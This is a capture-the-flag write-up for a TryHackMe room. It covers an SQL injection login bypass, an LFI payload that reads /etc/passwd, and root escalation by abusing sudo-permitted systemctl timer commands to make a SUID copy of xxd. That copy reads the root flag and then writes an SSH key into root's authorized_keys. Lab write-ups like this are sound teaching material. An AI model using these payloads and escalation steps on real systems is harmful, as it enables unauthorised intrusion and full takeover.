This was a cool box to solve. It involved a bit of a weird start, but the rest was pretty cool and consisted of fuzzing for SQLi, an LFI vulnerability, an SSH misconfiguration and abusing a `.timer` & `.service` process.

The command is split up as follows:

1. `-w` sets a wordlist. I chose [this](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/login-bypass/sql-login-bypass.md) one, from a public repo.
2. `-X` sets the request method. From the intercepted login request, I confirmed that it's a POST request we're dealing with.
3. `-u` sets the target URL
4. `-d` sets the POST data (including the `FUZZ` parameter here)
5. `-H` sets the POST headers
6. `-fr` sets a regex filter. Since most requests would naturally fail, and then contain the phrase "Login failed. Please check your username and password", I filtered these out.

I could use any of the above payloads to bypass the login, and found the secret adminpanel this way. Clicking around in the adminpanel, I found an LFI in this endpoint, directly returning the content of `/etc/passwd` in the browser:

```
http://cheese.thm/secret-script.php?file=php://filter/resource=/etc/passwd
```

## Getting the Root Flag

As user `comte` I could run `sudo -l` and found that I could run four binaries as root:

```console
comte@ip-10-113-165-239:~$ sudo -l
User comte may run the following commands on ip-10-113-165-239:
    (ALL) NOPASSWD: /bin/systemctl daemon-reload
    (ALL) NOPASSWD: /bin/systemctl restart exploit.timer
    (ALL) NOPASSWD: /bin/systemctl start exploit.timer
    (ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

It was clear that these are four binaries that should be ran in this particular order, but at the time I did neither knew that `.timer/.service` applications existed nor how they worked. Essentially, it's just a cronjob that is a bit more cumbersome to set up, but offers some additional flexibility and better logging/auditing capabilities. This was `exploit.timer`'s content:

```console
comte@ip-10-113-165-239:~$ cat /etc/systemd/system/exploit.timer 
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=

[Install]
WantedBy=timers.target
```

Running the four binaries with sudo did not work right away, so I went back and tried modifying the scripts. After consulting Claude, I found that `exploit.timer` had no call to `exploit.service`, so of course the timer didn't run the exploit. I simply added the line `Unit=exploit.service` in the `[Timer]` field to fix this. But what does the exploit itself, i.e. `exploit.service`, actually do?

```console
comte@ip-10-113-165-239:~$ cat /etc/systemd/system/exploit.service
[Unit]
Description=Exploit Service

[Service]
Type=oneshot
ExecStart=/bin/bash -c "/bin/cp /usr/bin/xxd /opt/xxd && /bin/chmod +sx /opt/xxd"
```

The exploit consist of two steps:

1. First, copy the binary `/usr/bin/xxd` to `/opt/xxd`
2. Then, make the new `/opt/xxd` binary executable and set its SUID-bit.

Now I ran the four commands using `sudo`:

```console
comte@ip-10-113-165-239:~$ sudo /bin/systemctl daemon-reload
comte@ip-10-113-165-239:~$ sudo /bin/systemctl restart exploit.timer
comte@ip-10-113-165-239:~$ sudo /bin/systemctl start exploit.timer
comte@ip-10-113-165-239:~$ sudo /bin/systemctl enable exploit.timer
Created symlink /etc/systemd/system/timers.target.wants/exploit.timer → /etc/systemd/system/exploit.timer.
comte@ip-10-113-165-239:~$ ls -lah /opt/xxd
-rwsr-sr-x 1 root root 19K Jul 26 14:58 /opt/xxd
```

As can be seen above, we now have `/opt/xxd`. Finally, I checked GTFOBins and found an exploit for `xxd` with SUID-bit set. I ran this and got the root flag by guessing its usual location and name:

```console
comte@ip-10-113-165-239:~$ /opt/xxd /root/root.txt | /opt/xxd -r
      _                           _       _ _  __
  ___| |__   ___  ___  ___  ___  (_)___  | (_)/ _| ___
 / __| '_ \ / _ \/ _ \/ __|/ _ \ | / __| | | | |_ / _ \
| (__| | | |  __/  __/\__ \  __/ | \__ \ | | |  _|  __/
 \___|_| |_|\___|\___||___/\___| |_|___/ |_|_|_|  \___|


THM{dca75486094810807faf4b7b0a929b11e5e0167c}
```

The final command just creates a hexdump of `/root/root.txt` and then pipes it back to `xxd` with the reverse flag `-r` set, i.e. we just get the contents from `root.txt` back.


## Getting a Root Shell

It did bug me that I had only *read* the root flag, and not gotten a root shell. I followed [this](https://0xb0b.gitbook.io/writeups/tryhackme/2024/cheese-ctf#web-access) write-up to see how to manage this remaining problem. The trick was that one could use the exploitable binary `/opt/xxd` to write `comte`'s public SSH-key to the `authorized_keys` file for the root user:

1. Run `ssh-keygen -t rsa` as `comte`. This generates an SSH key-pair for `comte`.
2. Run `cat .ssh/id_rsa` and copy the public key.
3. Write the public key to `authorized_keys` in `/root` using the SUID-bit-set-binary `/opt/xxd`: `comte@ip-10-113-165-239:~/.ssh$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDNkZgS1dCpq5Dhi7rTSxJEkxifvrbR53vNOL/XZRicWs4YsoZR3aRO7bdbuE+GorDfG3MifiDiytfubU/f9AvJSgQtQVlJDtaVXc2Byn1HtgldgIkBSeb+nEYe/eABuN9Y/E3RoD/aKdlpbMIePe0GqlFSv8qHkIFJPEYOfQ2n87PPUbX9t4Ph+7hQFT8sho783O0EuTEulJYQmuiurw57zGLnUY0NMQSJBpmq4AljYYtrywJb7ST4Q3yZn/sft3RGeuzs+UCummS0xrAoB+p9bNRngLVKBSI3DGPrRWvpfymt865k8mE8YAPCXSwymGqndUMZQ3Hkh0csL39AFsfxWp8zLkjlEh3DQhCHVyO/mJh0z4VXyPhruTxcqy7l+t6LlAcPsBkmsaXTI0M5CLGg30QkR3l0aPZ4+sg8Onbx6pA11XTzuNUJMorClGxj8JkO052N4oTcx9bjhqlcHWnubKJyI6GRkTAqZ0vOZrI3UAzzAePu7x88Ne4sJEfbnSk= comte@ip-10-113-165-239' | /opt/xxd | /opt/xxd -r - /root/.ssh/authorized_keys`
4. Notice that we can use `xxd`to *write* to `authorized_keys` by virtue of the `-r - ` flags, i.e. the second dash makes a difference, as can be read in the man page `man xxd`: "If no outfile is given (or a `-' character  is  in its place), results are sent to standard output."
5. SSH as `root` onto the box with `ssh root@10.113.165.239`

Then, finally, one has the root shell:

```console
root@ip-10-113-165-239:~# id
uid=0(root) gid=0(root) groups=0(root)
```




## Lessons Learned
1. How `.service/.timer` files work
